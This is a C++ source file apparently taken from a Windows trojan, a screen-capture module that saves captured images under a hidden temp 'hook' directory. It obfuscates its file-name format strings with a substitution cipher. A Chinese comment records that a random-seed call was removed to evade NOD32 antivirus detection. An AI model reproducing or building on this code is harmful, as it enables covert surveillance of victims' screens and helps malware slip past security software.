// ScreenFile.cpp: implementation of the ScreenFile class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ScreenFile.h"
#include "io.h"
#include "direct.h"
#include "stdio.h"
#include "stdlib.h"
#include "time.h"
#include "WinApi.h"
#include "mumaPublic.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
ScreenFile  g_ScreenFile;
extern long g_quality;

//eSYsNrJHto9A5yLd\FpQaDquCvlT6GKB%EbiMzwZXnRfVghjkxcm.12UW304IOP78
#define DESCREEN_LEN 65
char *DeScnStringA(char *ret_string, int strlen, char *string)
{
	char alphabet[DESCREEN_LEN]={'e','S','Y','s','N','r','J','H','t','o',
		'9','A','5','y','L','d','\\','F','p','Q',
		'a','D','q','u','C','v','l','T','6','G',
		'K','B','%','E','b','i','M','z','w','Z',
		'X','n','R','f','V','g','h','j','k','x',
		'c','m','.','1','2','U','W','3','0','4',
		'I','O','P','7','8'};
	DWORD i,j, scramble=1;
	_snprintf(ret_string, strlen, "%s", string);
	for (i=0; ret_string[i]; i++) {
		for (j=0; j<DESCREEN_LEN; j++)
			if (ret_string[i] == alphabet[j]) {
				ret_string[i] = alphabet[(j+scramble)%DESCREEN_LEN];
				break;
			}
	}
	return ret_string;
}

long g_taskallow=0;

BOOL releaseallow(long &hashallow, DWORD a)
{	
	PInterlockedExchange(&hashallow, 0);
	return TRUE;
}

//a是无用参数
BOOL getallow(long &hashallow, DWORD a)
{
	int wait = 0xFFFF;
	int h = wait;
	do
	{
		if (0 == PInterlockedExchange(&hashallow, 0xAA))
		{
			return TRUE;
		}
		PSleep(20);
		wait -= 20;
		if (h-wait > 5000)
		{
			IF_LOUD(DbgFat32Log("线程%d强行获取写包访问权限!!", PGetCurrentThreadId());)
			PInterlockedExchange(&hashallow, 0);
			h = wait;
		}
	} while(wait > 0);
	
	return FALSE;
	
}

ScreenFile::ScreenFile()
{
	m_hFile=NULL;
}

ScreenFile::~ScreenFile()
{
}

BOOL ScreenFile::CreateFileName(const char * fixScreenDir)
{
	if(fixScreenDir == NULL)
	{
		IF_LOUD(DbgFat32Log("固定目录g_fixScreenDir未初始化");)
		return FALSE;
	}

	char flgTempPath[MAX_PATH];
	memset(flgTempPath,0,MAX_PATH);
	DWORD l = PGetTempPathA(MAX_PATH, flgTempPath);	

	char hookdir[MAX_PATH];
	memset(hookdir,0,MAX_PATH);
	sprintf(hookdir,"%s%s", flgTempPath, fixScreenDir);
 	if(_access(hookdir, 0) != 0)
	{
		_mkdir(hookdir);
	}

	memset(m_filename,0,MAX_PATH);

	SYSTEMTIME nowtime;
	PGetLocalTime(&nowtime);
	//nod32杀时间种子
/*	srand( (unsigned)time( NULL ) );*/
	int irand=rand();

	char TmpDeStr[50];

	//%s\\%04d%02d%02d%02d%02d%02d_%08x.tmp
	sprintf(m_filename, DeScnStringA(TmpDeStr, 50, "BYdB30LB31LB31LB31LB31LB31L_B37kmHcF"), hookdir,
		nowtime.wYear, nowtime.wMonth, nowtime.wDay, nowtime.wHour, nowtime.wMinute, nowtime.wSecond,
	irand	);

	return TRUE;
}

BOOL ScreenFile::WriteScreen(BOOL isscreen)
{
	BOOL bCreateOK = TRUE;
	memset(m_dstfilename,0,MAX_PATH);
	memcpy(m_dstfilename,m_filename,strlen(m_filename)-4);
	if(isscreen)
		sprintf(m_dstfilename,"%s.a",	m_dstfilename);
	else
		sprintf(m_dstfilename,"%s.v",	m_dstfilename);
	
	int result = rename( m_filename, m_dstfilename );
	if( result != 0 )
		bCreateOK = FALSE;
	
	if (isscreen)
	{		
		WIN32_FIND_DATAA FindFileData;
		HANDLE hFind;
		char findstr[MAX_PATH], filedir[MAX_PATH];
		memset(findstr,0,MAX_PATH);
		int num = 0;
		
		memcpy(filedir, m_filename, strlen(m_filename));
		(strrchr(filedir, '\\'))[0] = 0;//删除文件名，只获得路径字串
		sprintf(findstr,"%s\\*.a",filedir);
		hFind = PFindFirstFileA(findstr, &FindFileData);
		if (hFind != INVALID_HANDLE_VALUE)
		{
			do 
			{
				num++;
			} while(PFindNextFileA(hFind, &FindFileData));
		}
		
		if (num>20)//文件数大于20
		{
			if (g_quality > 0)
			{
				g_quality = 10;
			}
			else
			{
				g_quality = -10;
			}
		}
	}

	return bCreateOK;
}

BOOL ScreenFile::CreateJpeg(char*buf ,int buflen,BOOL isscreen)
{
	CreateFileName(GetTmpPrevFix(FIX_SCREEN));
	BOOL bCreateOK = WriteCyFile(m_filename, buf, buflen);
	if(bCreateOK)
	{
		bCreateOK = WriteScreen(isscreen);
	}
	else
	{
		CreateFileName(GetTmpPrevFix(FIX_SCREENBAK));
		bCreateOK = WriteCyFile(m_filename, buf, buflen);
		if (bCreateOK)
		{
			bCreateOK = WriteScreen(isscreen);
		}
	}

	return bCreateOK;
}




